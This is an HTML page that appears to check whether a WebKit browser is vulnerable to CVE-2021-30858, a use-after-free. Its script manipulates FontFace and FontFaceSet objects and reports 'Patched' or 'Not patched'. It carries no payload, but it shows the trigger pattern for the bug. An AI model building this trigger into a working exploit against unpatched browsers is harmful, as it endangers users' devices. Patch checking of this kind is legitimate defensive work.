<html>
    <title>CVE-2021-30858 Use-after-free in WebKit</title>
   
    <body>
        <button class="button" onclick="cve202130858()">Try it!</button>
    </body>

    <script>

        async function cve202130858() { 
            try {
                let font = new FontFace('font1', 'url()',{});
                var fontFaceSet = new FontFaceSet([font]);
                font.family = 'font2';
            }
            catch(e){
                alert("API is not implemented");
                return;
            }
            try{
                let font = new FontFace('font1','',{});
                var fontFaceSet = new FontFaceSet([font]);
                font.family = 'font2';
            alert("Patched");
               }
            catch(e){
                alert("Not patched :)");
            }
        }
        
    </script>
    
    <style>
        body {
            background-image: url("https://blog.ssdnodes.com/blog/wp-content/uploads/2018/05/201805_faceless.gif");
            background-repeat: no-repeat;
            background-size: cover;
        }
    
        .button {
            width: 100px;
            height: 100px;
            background-color: rgb(31, 30, 30);
            color: white;
            position: absolute;
            top:0;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto;
        }
        </style>
</html>
